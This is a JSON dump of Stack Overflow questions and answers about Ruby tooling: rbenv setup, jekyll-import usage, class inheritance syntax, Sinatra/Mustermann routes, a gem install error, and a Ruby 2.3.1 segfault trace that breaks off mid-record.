"https://stackoverflow.com/questions/52041464/sublime-text-when-building-rb-file-it-fails-and-give-me-bash-ruby-command-no/52041582#52041582", "title": "Sublime text when building .rb file it fails and give me &quot;bash: ruby: command not found&quot;", "body": "<p>Looks like ruby is not installed on your system.</p>\n\n<p>Open the terminal, them run the following commands:</p>\n\n<pre><code>git clone https://github.com/rbenv/rbenv.git ~/.rbenv\necho 'export PATH=\"$HOME/.rbenv/bin:$PATH\"' &gt;&gt; ~/.bashrc\necho 'eval \"$(rbenv init -)\"' &gt;&gt; ~/.bashrc\nexec $SHELL\n\ngit clone https://github.com/rbenv/ruby-build.git ~/.rbenv/plugins/ruby-build\necho 'export PATH=\"$HOME/.rbenv/plugins/ruby-build/bin:$PATH\"' &gt;&gt; ~/.bashrc\nexec $SHELL\n\nrbenv install 2.5.1\nrbenv global 2.5.1\nruby -v\n</code></pre>\n\n<p>Them try compiling it again.</p>\n"}, {"comments": [{"owner": {"reputation": 858, "user_id": 8870694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3f251f0bd3900352fc6eb4dcc6a124e?s=128&d=identicon&r=PG", "display_name": "Elta3lab", "link": "https://stackoverflow.com/users/8870694/elta3lab"}, "edited": false, "score": 0, "creation_date": 1535399152, "post_id": 52044750, "comment_id": 91043062, "body": "after applying the two commands, &quot;which ruby&quot; returns nothing, I don&#39;t remember how I installed it, how can I check it it&#39;s installed using rbenv or not, and for specific user or system wide ?"}], "tags": [], "owner": {"reputation": 3615, "user_id": 1040031, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/PPKXg.jpg?s=128&g=1", "display_name": "Bogdan Stoica", "link": "https://stackoverflow.com/users/1040031/bogdan-stoica"}, "is_accepted": false, "score": 0, "last_activity_date": 1535393155, "creation_date": 1535393155, "answer_id": 52044750, "question_id": 52041464, "link": "https://stackoverflow.com/questions/52041464/sublime-text-when-building-rb-file-it-fails-and-give-me-bash-ruby-command-no/52044750#52044750", "title": "Sublime text when building .rb file it fails and give me &quot;bash: ruby: command not found&quot;", "body": "<p>Maybe they are already installed but it's not found so maybe it's not in the default path. On a shell console try this (it's already suggested in a previous answer to your question):</p>\n\n<pre><code>export PATH=\"$HOME/.rbenv/bin:$PATH\"' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\n</code></pre>\n\n<p>Then issue a <code>which ruby</code>. See if it returns anything. Try also a <code>ruby -v</code> and see if it prints the ruby version.</p>\n\n<p>If you have installed ruby using <strong>rbenv</strong> please double check if you installed it system wide or for a specific user. If you installed it as root let's say, when you're running sublime as a regular user, it won't find <strong>ruby</strong>. Either install it using <strong>rbenv</strong> for that specific user you're trying to run Sublime or install it system wide using a package manager so <strong>ruby</strong> will be available for all the users of that linux system.</p>\n"}], "owner": {"reputation": 858, "user_id": 8870694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3f251f0bd3900352fc6eb4dcc6a124e?s=128&d=identicon&r=PG", "display_name": "Elta3lab", "link": "https://stackoverflow.com/users/8870694/elta3lab"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 440, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1535393155, "creation_date": 1535379875, "question_id": 52041464, "link": "https://stackoverflow.com/questions/52041464/sublime-text-when-building-rb-file-it-fails-and-give-me-bash-ruby-command-no", "title": "Sublime text when building .rb file it fails and give me &quot;bash: ruby: command not found&quot;", "body": "<p>I have a file called \"solutions.rb\" and I'm trying to build it and see the output using sublime text.</p>\n\n<p>the content of solutions.rb</p>\n\n<pre><code>puts \"Hello world\"\n</code></pre>\n\n<p>after pressing ctrl+B to build the file I got this error</p>\n\n<pre><code>bash: ruby: command not found\n[Finished in 0.0s with exit code 127]\n[shell_cmd: ruby \"/home/elta3lab/Desktop/solution.rb\"]\n[dir: /home/elta3lab/Desktop]\n[path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin]\n</code></pre>\n\n<p>knowing that I tried some solutions from answers I foudn on stackoverflow, but they never work, and I didn't understand every command I wrote because I'm not that good with linux.</p>\n\n<p><a href=\"https://i.stack.imgur.com/zQuJJ.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/zQuJJ.png\" alt=\"enter image description here\"></a></p>\n"}, {"tags": ["ruby", "wordpress", "export", "jekyll"], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 1974028, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/72015e353daecd7a1403443caa3cd79a?s=128&d=identicon&r=PG", "display_name": "perffaith", "link": "https://stackoverflow.com/users/1974028/perffaith"}, "edited": false, "score": 0, "creation_date": 1535436788, "post_id": 52045179, "comment_id": 91052542, "body": "OK, but I need to modify downloaded script before importing."}, {"owner": {"reputation": 30418, "user_id": 823617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmWH1.png?s=128&g=1", "display_name": "Casper", "link": "https://stackoverflow.com/users/823617/casper"}, "reply_to_user": {"reputation": 1, "user_id": 1974028, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/72015e353daecd7a1403443caa3cd79a?s=128&d=identicon&r=PG", "display_name": "perffaith", "link": "https://stackoverflow.com/users/1974028/perffaith"}, "edited": false, "score": 0, "creation_date": 1535447665, "post_id": 52045179, "comment_id": 91058561, "body": "See my edit. You can specify those options on the command line."}, {"owner": {"reputation": 1, "user_id": 1974028, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/72015e353daecd7a1403443caa3cd79a?s=128&d=identicon&r=PG", "display_name": "perffaith", "link": "https://stackoverflow.com/users/1974028/perffaith"}, "edited": false, "score": 0, "creation_date": 1535464201, "post_id": 52045179, "comment_id": 91069264, "body": "except passing options I need to modify script to save permalink for every post in post properties"}, {"owner": {"reputation": 46692, "user_id": 1548376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qCZQw.gif?s=128&g=1", "display_name": "David Jacquel", "link": "https://stackoverflow.com/users/1548376/david-jacquel"}, "edited": false, "score": 0, "creation_date": 1535469005, "post_id": 52045179, "comment_id": 91072438, "body": "The fact that you&#39;re hacking this gem doesn&#39;t change the way it is invoked in the command line."}, {"owner": {"reputation": 30418, "user_id": 823617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmWH1.png?s=128&g=1", "display_name": "Casper", "link": "https://stackoverflow.com/users/823617/casper"}, "reply_to_user": {"reputation": 1, "user_id": 1974028, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/72015e353daecd7a1403443caa3cd79a?s=128&d=identicon&r=PG", "display_name": "perffaith", "link": "https://stackoverflow.com/users/1974028/perffaith"}, "edited": false, "score": 0, "creation_date": 1535474279, "post_id": 52045179, "comment_id": 91075627, "body": "@perffaith See my last edit. You can download the code yourself, modify it as you wish, and then run it they way you want in your irb console."}], "tags": [], "owner": {"reputation": 30418, "user_id": 823617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmWH1.png?s=128&g=1", "display_name": "Casper", "link": "https://stackoverflow.com/users/823617/casper"}, "is_accepted": false, "score": 0, "last_activity_date": 1535474199, "last_edit_date": 1535474199, "creation_date": 1535395028, "answer_id": 52045179, "question_id": 52041212, "link": "https://stackoverflow.com/questions/52041212/how-to-pass-arguments-to-ruby-script/52045179#52045179", "title": "How to pass arguments to ruby script", "body": "<p>That seems to be the old <code>jekyll-import</code> v1.x method. The new method of importing is running <code>jekyll import</code> from the command line.</p>\n\n<p>Simply run:</p>\n\n<pre><code>gem install jekyll-import\n</code></pre>\n\n<p>Then:</p>\n\n<pre><code>jekyll import wordpressdotcom --help\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Usage:\n\n  jekyll import wordpressdotcom [options]\n\nOptions:\n            --source FILE  WordPress export XML file (default: \"wordpress.xml\")\n            --no-fetch-images  Do not fetch the images referenced in the posts\n            --assets_folder FOLDER  Folder where assets such as images will be do\n</code></pre>\n\n<p>As you can see, you can specify <code>source</code> and <code>assets_folder</code> on the command line.</p>\n\n<p><strong>If you want to modify the source and run the gem yourself</strong>:</p>\n\n<p>First:</p>\n\n<pre><code>git clone https://github.com/jekyll/jekyll-import\nbundle install\n</code></pre>\n\n<p>Now edit the code as you please, then:</p>\n\n<pre><code>rake console\n</code></pre>\n\n<p>And you will get an <code>irb</code> console where you can run </p>\n\n<pre><code>JekyllImport::Importers::WordpressDotCom.run(...)\n</code></pre>\n\n<p>If you want to install your modified gem into the system instead:</p>\n\n<pre><code>rake install\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 1974028, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/72015e353daecd7a1403443caa3cd79a?s=128&d=identicon&r=PG", "display_name": "perffaith", "link": "https://stackoverflow.com/users/1974028/perffaith"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 184, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1535474199, "creation_date": 1535378977, "last_edit_date": 1535437205, "question_id": 52041212, "link": "https://stackoverflow.com/questions/52041212/how-to-pass-arguments-to-ruby-script", "title": "How to pass arguments to ruby script", "body": "<p>I'm trying to import posts from a WordPress to jekyll</p>\n\n<p><a href=\"https://import.jekyllrb.com/docs/wordpressdotcom/\" rel=\"nofollow noreferrer\">https://import.jekyllrb.com/docs/wordpressdotcom/</a></p>\n\n<p>I should run:</p>\n\n<pre><code>$ ruby -rubygems -e 'require \"jekyll-import\";\nJekyllImport::Importers::WordpressDotCom.run({\n  \"source\" =&gt; \"wordpress.xml\",\n  \"no_fetch_images\" =&gt; false,\n  \"assets_folder\" =&gt; \"assets\"\n})'\n</code></pre>\n\n<p>But I need to modify the script first\n<a href=\"https://github.com/jekyll/jekyll-import/blob/v0.14.0/lib/jekyll-import/importers/wordpressdotcom.rb\" rel=\"nofollow noreferrer\">https://github.com/jekyll/jekyll-import/blob/v0.14.0/lib/jekyll-import/importers/wordpressdotcom.rb</a>.</p>\n\n<p>How can I run downloaded script wordpressdotcom.rb passing arguments like <code>source</code> and <code>assets_folder</code>?</p>\n"}, {"tags": ["ruby", "syntax"], "comments": [{"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 2, "creation_date": 1535378718, "post_id": 52040468, "comment_id": 91032813, "body": "Seems like there are answers enough, however I didn&#39;t see a reference to the official Ruby doc yet. So here you go: <a href=\"http://ruby-doc.org/core-2.5.1/doc/syntax/modules_and_classes_rdoc.html#label-Inheritance\" rel=\"nofollow noreferrer\">ruby-doc.org/core-2.5.1/doc/syntax/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 2, "creation_date": 1535425946, "post_id": 52040500, "comment_id": 91049646, "body": "Using the term &quot;extend&quot; in your sense should be avoided in the context of Ruby because it means something else. It is misleading."}], "tags": [], "owner": {"reputation": 17097, "user_id": 672689, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IPnRU.png?s=128&g=1", "display_name": "Roee Gavirel", "link": "https://stackoverflow.com/users/672689/roee-gavirel"}, "is_accepted": false, "score": 1, "last_activity_date": 1535436855, "last_edit_date": 1535436855, "creation_date": 1535376409, "answer_id": 52040500, "question_id": 52040468, "link": "https://stackoverflow.com/questions/52040468/what-does-mean-when-defining-a-class/52040500#52040500", "title": "What does &#39;&lt;&#39; mean when defining a class?", "body": "<p>It means that <code>PostsController</code> definition starts by having everything in <code>ApplicationController</code>. while the rest of the definitions will add/replace members/attributes to <code>PostsController</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 9602, "user_id": 3607136, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/NRFso.jpg?s=128&g=1", "display_name": "Gagan Gami", "link": "https://stackoverflow.com/users/3607136/gagan-gami"}, "is_accepted": false, "score": 6, "last_activity_date": 1535429444, "last_edit_date": 1535429444, "creation_date": 1535376612, "answer_id": 52040549, "question_id": 52040468, "link": "https://stackoverflow.com/questions/52040468/what-does-mean-when-defining-a-class/52040549#52040549", "title": "What does &#39;&lt;&#39; mean when defining a class?", "body": "<p><code>&lt;</code> is used for <strong>Inheritance</strong>. In Ruby, a class can only inherit from a single other class.</p>\n\n<blockquote>\n  <p>class PostsController &lt; ApplicationController</p>\n</blockquote>\n\n<p>in above line of code <code>PostsController</code> (child-class) is inherits from <code>ApplicationController</code> parent-class.</p>\n\n<p><strong>In Rails:</strong></p>\n\n<p><code>Action Controllers</code> are the core of a web request in Rails. By default, only the <code>ApplicationController</code> in a Rails application inherits from <code>ActionController::Base</code>. All other controllers inherit from <code>ApplicationController</code>. This gives you one class to configure things such as request forgery protection and filtering of sensitive request parameters.</p>\n\n<p>for more info : </p>\n\n<ul>\n<li><a href=\"http://ruby-doc.org/core-2.5.1/doc/syntax/modules_and_classes_rdoc.html#label-Inheritance\" rel=\"nofollow noreferrer\">http://ruby-doc.org/core-2.5.1/doc/syntax/modules_and_classes_rdoc.html#label-Inheritance</a></li>\n<li><a href=\"http://rubylearning.com/satishtalim/ruby_inheritance.html\" rel=\"nofollow noreferrer\">http://rubylearning.com/satishtalim/ruby_inheritance.html</a></li>\n<li><a href=\"https://api.rubyonrails.org/classes/ActionController/Base.html\" rel=\"nofollow noreferrer\">https://api.rubyonrails.org/classes/ActionController/Base.html</a></li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 325, "user_id": 8401455, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FpBGEciJUIg/AAAAAAAAAAI/AAAAAAAAAAk/iU1DMcfZagk/photo.jpg?sz=128", "display_name": "Javier Rodriguez", "link": "https://stackoverflow.com/users/8401455/javier-rodriguez"}, "is_accepted": false, "score": 1, "last_activity_date": 1535376643, "creation_date": 1535376643, "answer_id": 52040566, "question_id": 52040468, "link": "https://stackoverflow.com/questions/52040468/what-does-mean-when-defining-a-class/52040566#52040566", "title": "What does &#39;&lt;&#39; mean when defining a class?", "body": "<p>What you're saying there is: \"Declare a new class called <strong>PostsController</strong> and inherit the behaviour from <strong>ApplicationsController</strong> to be used in <strong>PostsController</strong>\".</p>\n\n<p>Basically &lt; is used for Inheritance</p>\n\n<p>More info <a href=\"http://rubylearning.com/satishtalim/ruby_inheritance.html\" rel=\"nofollow noreferrer\">here</a></p>\n"}, {"tags": [], "owner": {"reputation": 3047, "user_id": 10388629, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/My8T3.png?s=128&g=1", "display_name": "Pika the Master of the Whales", "link": "https://stackoverflow.com/users/10388629/pika-the-master-of-the-whales"}, "is_accepted": false, "score": 0, "last_activity_date": 1543368100, "creation_date": 1543368100, "answer_id": 53510690, "question_id": 52040468, "link": "https://stackoverflow.com/questions/52040468/what-does-mean-when-defining-a-class/53510690#53510690", "title": "What does &#39;&lt;&#39; mean when defining a class?", "body": "<p>Using <code>&lt;</code> indicates <a href=\"https://ruby-doc.org/docs/ruby-doc-bundle/UsersGuide/rg/inheritance.html\" rel=\"nofollow noreferrer\">inheritance</a>. Basically, this means that <code>PostsController</code> will have everything <code>ApplicationController</code> has, except for it's <a href=\"https://ruby-doc.org/docs/ruby-doc-bundle/UsersGuide/rg/accesscontrol.html\" rel=\"nofollow noreferrer\">private members</a>. However, you can <a href=\"http://rubylearning.com/satishtalim/ruby_overriding_methods.html\" rel=\"nofollow noreferrer\">override methods</a> in the subclass to change the behavior of the methods inherited from the superclass.</p>\n"}], "owner": {"reputation": 79, "user_id": 4762707, "user_type": "registered", "profile_image": "https://graph.facebook.com/993441920668062/picture?type=large", "display_name": "Neil Axinto", "link": "https://stackoverflow.com/users/4762707/neil-axinto"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "answer_count": 4, "score": 1, "last_activity_date": 1543368100, "creation_date": 1535376298, "last_edit_date": 1535425878, "question_id": 52040468, "link": "https://stackoverflow.com/questions/52040468/what-does-mean-when-defining-a-class", "title": "What does &#39;&lt;&#39; mean when defining a class?", "body": "<p>I have this line of Ruby code generated by rails:</p>\n\n<pre><code>class PostsController &lt; ApplicationController\n</code></pre>\n\n<p>What does <code>&lt;</code> mean?</p>\n"}, {"tags": ["ruby", "string", "url", "sinatra"], "answers": [{"comments": [{"owner": {"reputation": 949, "user_id": 906230, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/26cf4cf1d265e6dc6aa3f34b4f813898?s=128&d=identicon&r=PG", "display_name": "fullstackplus", "link": "https://stackoverflow.com/users/906230/fullstackplus"}, "edited": false, "score": 0, "creation_date": 1535545919, "post_id": 52064163, "comment_id": 91104744, "body": "Thanks \u2014 I hadn&#39;t formulated my question correctly, corrections above."}, {"owner": {"reputation": 1197, "user_id": 400743, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1a0d5c51291898c92154ba4ac1c56cd6?s=128&d=identicon&r=PG", "display_name": "Bartosz Pietraszko", "link": "https://stackoverflow.com/users/400743/bartosz-pietraszko"}, "reply_to_user": {"reputation": 949, "user_id": 906230, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/26cf4cf1d265e6dc6aa3f34b4f813898?s=128&d=identicon&r=PG", "display_name": "fullstackplus", "link": "https://stackoverflow.com/users/906230/fullstackplus"}, "edited": false, "score": 1, "creation_date": 1535563117, "post_id": 52064163, "comment_id": 91116179, "body": "@abbottjam you&#39;re welcome, now it&#39;s clear what the problem was. I hope the answer brought something of value anyway."}, {"owner": {"reputation": 949, "user_id": 906230, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/26cf4cf1d265e6dc6aa3f34b4f813898?s=128&d=identicon&r=PG", "display_name": "fullstackplus", "link": "https://stackoverflow.com/users/906230/fullstackplus"}, "edited": false, "score": 0, "creation_date": 1535617676, "post_id": 52064163, "comment_id": 91134741, "body": "Absolutely \u2014 it was your answer that prompted me to look in the right direction and it also contains a lot of valuable info I didn&#39;t know."}], "tags": [], "owner": {"reputation": 1197, "user_id": 400743, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1a0d5c51291898c92154ba4ac1c56cd6?s=128&d=identicon&r=PG", "display_name": "Bartosz Pietraszko", "link": "https://stackoverflow.com/users/400743/bartosz-pietraszko"}, "is_accepted": true, "score": 1, "last_activity_date": 1535480641, "creation_date": 1535480641, "answer_id": 52064163, "question_id": 52038235, "link": "https://stackoverflow.com/questions/52038235/mustermanncompileerror-in-url/52064163#52064163", "title": "Mustermann::CompileError in URL", "body": "<p>Sinatra route helpers and Mustermann itself do not accept full URLs as patterns, only paths - you can't put hostnames in them. Mustermann's <a href=\"https://github.com/sinatra/mustermann\" rel=\"nofollow noreferrer\">README</a> provide full list of supported pattern types and all samples there show paths. As you called it, 'restrictive' behaviour is normal because it's not a general purpose pattern matching library - it's dedicated specifically to handling URL paths.</p>\n\n<p>If you wan't to specify hostname for Sinatra route, you can do it with optional <code>host_name</code> parameter.</p>\n\n<pre><code>get '/2018/07/08/test-article', host_name: 'example.com' do\n  erb :article  \nend\n</code></pre>\n\n<p>If you want to use Mustermann for custom matching, the <code>uri-template</code> pattern type listed in the docs works with full URLs. You will have to install <code>mustermann-contrib</code> gem and get a grasp of slightly different pattern syntax.</p>\n\n<pre><code>irb(main):011:0&gt; require 'mustermann'\n=&gt; true\nirb(main):012:0&gt; pattern = Mustermann.new(\"http://example.com/2018/07/08/{slug}\", type: 'uri-template')\n=&gt; #&lt;Mustermann::Template:\"http://example.com/2018/07/08/{slug}\"&gt;\nirb(main):013:0&gt; pattern.match \"http://example.com/2018/07/08/test-article\"\n=&gt; #&lt;MatchData \"http://example.com/2018/07/08/test-article\" slug:\"test-article\"&gt;\n</code></pre>\n"}], "owner": {"reputation": 949, "user_id": 906230, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/26cf4cf1d265e6dc6aa3f34b4f813898?s=128&d=identicon&r=PG", "display_name": "fullstackplus", "link": "https://stackoverflow.com/users/906230/fullstackplus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 271, "favorite_count": 0, "accepted_answer_id": 52064163, "answer_count": 1, "score": 0, "last_activity_date": 1535546606, "creation_date": 1535369089, "last_edit_date": 1535546606, "question_id": 52038235, "link": "https://stackoverflow.com/questions/52038235/mustermanncompileerror-in-url", "title": "Mustermann::CompileError in URL", "body": "<p>I've got a Sinatra-powered blog with the following method:</p>\n\n<pre><code>module Tir\n  module Blog\n    class Article\n\n      def url\n        [Tir::Config.domain, meta('relative_path')].join\n      end\n\n    end\n  end\nend\n</code></pre>\n\n<p>Calling this on an Article instance outputs the full URI of the article, like:</p>\n\n<pre><code>\"http://example.com/2018/07/08/test-article\"\n</code></pre>\n\n<p>The amazing Mustermann gives me the following error:</p>\n\n<blockquote>\n  <p>Mustermann::CompileError: capture name can't be empty: \"/<a href=\"http://example.com/2018/07/08/test-article\" rel=\"nofollow noreferrer\">http://example.com/2018/07/08/test-article</a>\"</p>\n</blockquote>\n\n<ol>\n<li>Why does it insert a forward slash at the beginning of the string?</li>\n<li>Why is it so restrictive wrt generated strings that aren't even Sinatra routes?</li>\n<li>How do I get rid of this problem?</li>\n</ol>\n\n<p>Thanks.</p>\n\n<p><strong>EDIT 29.08.2018:</strong>\nTurns out, Sinatra / Mustermann were blocking these strings because they <strong>were</strong> routes. My main method for generating dynamic article routes was this:</p>\n\n<pre><code>articles = []\n\nDir.glob('articles/*.mdown') do |file|\n article = initialize_article file\n if article.ready?\n   get(\"/#{article.url}\") do\n    erb :'articles/article',\n    :locals =&gt; { :article =&gt; article },\n    :layout =&gt; :'articles/layout_article'\n   end\n   articles &lt;&lt; article\n end\nend\n</code></pre>\n\n<p>The improved version uses a different method in the <code>get</code> block:</p>\n\n<pre><code>#articles.rb\n\narticles = []\n\nDir.glob('articles/*.mdown') do |file|\n article = initialize_article file\n if article.ready?\n   get(\"/#{article.relative_path}\") do\n    erb :'articles/article',\n    :locals =&gt; { :article =&gt; article },\n    :layout =&gt; :'articles/layout_article'\n   end\n   articles &lt;&lt; article\n end\nend\n</code></pre>\n\n<p>Method definitions:</p>\n\n<pre><code>#blog.rb\n\ndef relative_path\n meta('relative_path')\nend\n\ndef url\n [Tir::Config.domain, meta('relative_path')].join\nend\n</code></pre>\n\n<p>So now the <code>url</code> method isn't ever called in a route, only on an article object in one of the views \u2014 hence no errors.</p>\n"}, {"tags": ["ruby", "ubuntu", "rubygems"], "comments": [{"owner": {"reputation": 2572, "user_id": 2862049, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffd65bc37e559c2c407f064f308828a4?s=128&d=identicon&r=PG&f=1", "display_name": "Lukas Baliak", "link": "https://stackoverflow.com/users/2862049/lukas-baliak"}, "edited": false, "score": 1, "creation_date": 1535369410, "post_id": 52037947, "comment_id": 91026869, "body": "<a href=\"https://github.com/brigade/scss-lint#installation\" rel=\"nofollow noreferrer\">github.com/brigade/scss-lint#installation</a> use <code>gem install scss_lint</code>"}], "answers": [{"tags": [], "owner": {"reputation": 76, "user_id": 10223015, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6b7e5c1a67f77af2941d0e41f827552?s=128&d=identicon&r=PG&f=1", "display_name": "Baskiney", "link": "https://stackoverflow.com/users/10223015/baskiney"}, "is_accepted": false, "score": 2, "last_activity_date": 1535467743, "last_edit_date": 1535467743, "creation_date": 1535368569, "answer_id": 52038085, "question_id": 52037947, "link": "https://stackoverflow.com/questions/52037947/error-while-trying-to-install-ruby-gem/52038085#52038085", "title": "Error while trying to install ruby gem", "body": "<p>Is it possible the naming is wrong? Try using an underscore when installing.</p>\n\n<pre><code>gem install scss_lint\n</code></pre>\n"}], "owner": {"reputation": 441, "user_id": 6683131, "user_type": "registered", "accept_rate": 33, "profile_image": "https://lh5.googleusercontent.com/-PpG_Ki1Hirg/AAAAAAAAAAI/AAAAAAAACHA/b7EZm_Xjm7M/photo.jpg?sz=128", "display_name": "rahul mr", "link": "https://stackoverflow.com/users/6683131/rahul-mr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 145, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1535467743, "creation_date": 1535368043, "last_edit_date": 1535369193, "question_id": 52037947, "link": "https://stackoverflow.com/questions/52037947/error-while-trying-to-install-ruby-gem", "title": "Error while trying to install ruby gem", "body": "<p>while trying to install gem scss-lint , the following error throwed</p>\n\n<p><code>gem install scss-lint</code></p>\n\n<blockquote>\n  <p>ERROR:  While executing gem ... (ArgumentError)\n      wrong number of arguments (given 1, expected 0)</p>\n</blockquote>\n\n<p>the following screen shot is my gem environment</p>\n\n<p><a href=\"https://i.stack.imgur.com/1OUzP.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/1OUzP.png\" alt=\"enter image description here\"></a></p>\n"}, {"tags": ["ruby", "gcc", "rake"], "comments": [{"owner": {"reputation": 901, "user_id": 328618, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/3cdff9ca99598699395007b324f87678?s=128&d=identicon&r=PG", "display_name": "Jan", "link": "https://stackoverflow.com/users/328618/jan"}, "edited": false, "score": 0, "creation_date": 1535368352, "post_id": 52037944, "comment_id": 91026257, "body": "Hi! To get answers it&#39;s always helpful to start a question with a description of what you&#39;re trying to do. Good luck!"}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1535397610, "post_id": 52037944, "comment_id": 91042341, "body": "Similar bug reported under 2.3.1 <a href=\"https://bugs.ruby-lang.org/issues/13310\" rel=\"nofollow noreferrer\">#13310</a> suggested solution was <a href=\"https://bugs.ruby-lang.org/issues/13310#note-2\" rel=\"nofollow noreferrer\">upgrade to 2.3.3 or newer</a>"}, {"owner": {"reputation": 11, "user_id": 10279391, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-GTbLcdZg6vg/AAAAAAAAAAI/AAAAAAAAAAA/APUIFaPI0e4ddAG6XMmaw49CLrVOSisppw/mo/photo.jpg?sz=128", "display_name": "Yurich", "link": "https://stackoverflow.com/users/10279391/yurich"}, "reply_to_user": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1535906919, "post_id": 52037944, "comment_id": 91227796, "body": "@engineersmnky Unfortunately i cannot update to 2.3.3 because entire project uses version 2.3.1."}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1535907149, "post_id": 52037944, "comment_id": 91227854, "body": "Although I have not seen the code base the teeny version jump should not really impact anything. I would branch and upgrade and then run the specs to make sure but it is worth a shot over trying to fix this very internal issue"}], "owner": {"reputation": 11, "user_id": 10279391, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-GTbLcdZg6vg/AAAAAAAAAAI/AAAAAAAAAAA/APUIFaPI0e4ddAG6XMmaw49CLrVOSisppw/mo/photo.jpg?sz=128", "display_name": "Yurich", "link": "https://stackoverflow.com/users/10279391/yurich"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 706, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1535368042, "creation_date": 1535368042, "question_id": 52037944, "link": "https://stackoverflow.com/questions/52037944/ruby-2-3-1-on-ubuntu-18-04-bug-segmentation-fault", "title": "Ruby 2.3.1 on Ubuntu 18.04: [BUG] Segmentation fault", "body": "<pre><code>Ubuntu 18.04.1 LTS\nruby 2.3.1p112 (2016-04-26 revision 54768) [x86_64-linux]\nrbenv 1.0.0\nBundler version 1.16.2\nrake, version 10.5.0\n</code></pre>\n\n<p>Using <code>bundle exec rake db:drop</code> causes:</p>\n\n<pre><code>$ bundle exec rake db:drop\n~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl/ssl.rb:67: [BUG] Segmentation fault at 0x00000000000000\nruby 2.3.1p112 (2016-04-26 revision 54768) [x86_64-linux]\n\n-- Control frame information -----------------------------------------------\nc:0050 p:---- s:0189 e:000188 CFUNC  :initialize\nc:0049 p:---- s:0187 e:000186 CFUNC  :new\nc:0048 p:0129 s:0184 E:000e90 CLASS  ~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl/ssl.rb:67\nc:0047 p:0011 s:0182 e:000181 CLASS  ~/.rbenv/versions/2.3.1/lib/ruby/2.3.0/openssl/ssl.rb:18\nc:0046 p:0011 s:0180 e:000179 CLASS  